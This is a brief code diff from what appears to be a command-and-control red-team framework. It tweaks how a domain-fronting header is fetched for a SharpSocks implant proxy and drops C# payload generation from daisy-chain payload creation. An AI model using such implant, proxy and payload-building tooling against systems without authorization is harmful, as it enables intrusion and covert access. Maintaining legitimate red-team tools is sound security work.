@@ -238,7 +238,7 @@ def do_sharpsocks(user, command, randomuri):
     sharpurls = get_sharpurls()
     sharpurls = sharpurls.split(",")
     sharpurl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
-    dfheader = get_first_dfheader(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
+    dfheader = get_first_dfheader(select_item("DomainFrontHeader", "C2Server"))
     print(PoshInstallDirectory + "resources/SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN)
     ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
     if ri == "":
@@ -460,5 +460,4 @@ def do_startdaisy(user, command, randomuri):
         newPayload.CreateShellcode(name)
         newPayload.CreateEXE(name)
         newPayload.CreateMsbuild(name)
-        newPayload.CreateCS(name)
         print_good("Created new %s daisy payloads" % name)
